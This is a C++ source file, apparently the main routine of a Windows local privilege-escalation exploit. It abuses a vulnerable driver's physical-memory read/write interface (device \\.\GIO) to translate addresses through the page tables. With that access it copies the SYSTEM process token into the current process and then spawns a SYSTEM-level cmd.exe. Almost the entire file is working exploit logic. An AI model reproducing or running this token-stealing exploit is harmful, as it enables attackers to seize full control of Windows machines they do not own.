#include "memory.hpp"
#include "virtual_memory.hpp"
#include "process.hpp"

int main(int argc, char* argv[]) {
	std::cout << "[~] DRIVER RW Page Table Manipulation by Nana Bingies\n";
	std::cout << "[~] \"Nana Bingies\" DRIVER RW www.github.com/nanabingies\n";

	std::cout << std::endl;

	HANDLE driver = CreateFileW(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (driver == INVALID_HANDLE_VALUE) {
		std::cout << "[-] Failed to open handle to device\n";
		std::cout << "[-] Exiting ...\n";
		Sleep(5);
		return -1;
	}

	std::cout << "[+] Opened handle to device with value : 0x" << std::hex << driver << std::endl;

	 process::pml4Base = virtual_memory::GetPml4Base(driver);

	uintptr_t PsInitialSystemProcess = process::PsInitialSystemProcess(driver);
	std::cout << "[+] PsInitialSystemProcess : 0x" << std::hex << PsInitialSystemProcess << std::endl;


	uintptr_t currProcess = process::PsGetCurrentProcess(driver);
	std::cout << "[+] currProcess : 0x" << std::hex << currProcess << std::endl;
	std::cout << "[+] Current PID : " << std::hex << GetCurrentProcessId() << std::endl;

	std::cout << std::endl;

	uintptr_t SystemToken;
	uintptr_t converted_address = virtual_memory::convert_virtual_to_physical(driver, process::pml4Base, PsInitialSystemProcess + process::TokenOffset);
	uintptr_t read_data = memory::read_physical_memory(driver, converted_address, &SystemToken, sizeof(uintptr_t));
	std::cout << "[*****] System Token : 0x" << std::hex << SystemToken << std::endl;

	// write token to current process
	converted_address = virtual_memory::convert_virtual_to_physical(driver, process::pml4Base, currProcess + process::TokenOffset);
	std::cout << "[*****] Memory Write physical address : 0x" << std::hex << converted_address << std::endl;
	std::cout << "[*****] Write virtual address : 0x" << std::hex << currProcess + process::TokenOffset << std::endl;
	read_data = memory::write_physical_memory(driver, converted_address, (void *)SystemToken, sizeof(uintptr_t));

	system("cmd.exe");

	std::cout << std::endl;

	

	return 0;
}
